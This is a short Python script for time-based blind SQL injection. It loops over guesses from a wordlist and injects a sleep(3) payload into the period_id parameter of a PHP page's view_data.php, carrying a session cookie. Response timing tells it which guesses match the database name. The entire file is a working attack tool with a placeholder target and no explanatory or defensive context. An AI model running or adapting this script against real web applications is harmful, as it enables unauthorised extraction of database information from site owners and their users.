import requests
import time


def main(filename="SQLattack.txt"):
    ip = "0.0.0.0"
    port = 1234
    cookie_id = ""

    with open(filename, "r") as fin:
        lines = fin.readlines()
        url_part1 = f"http://{ip}:{port}/view_data.php?period_id=1%20and%20(select%20sleep(3)%20from%20dual%20where%20database()%20like%20%27%"
        url_part2 = "%%27)--+"
        
        for line in lines:
            start = time.time()
            line = line.strip()  # Remove newline character at the end of the line
            url = f"{url_part1}{line}{url_part2}"
            
            # cookie handling
            cookie = {'PHPSESSID': cookie_id}
            
            try:
                r = requests.post(url, cookies=cookie, timeout=5)
                print(url)
                print(r)
            except requests.exceptions.RequestException as e:
                print(f"Error: {str(e)}")
                continue

            end = time.time()
            full_time = end - start
            
            if full_time > 2:
                print(f"This Key: {line} Is found")


if __name__ == "__main__":
    main()
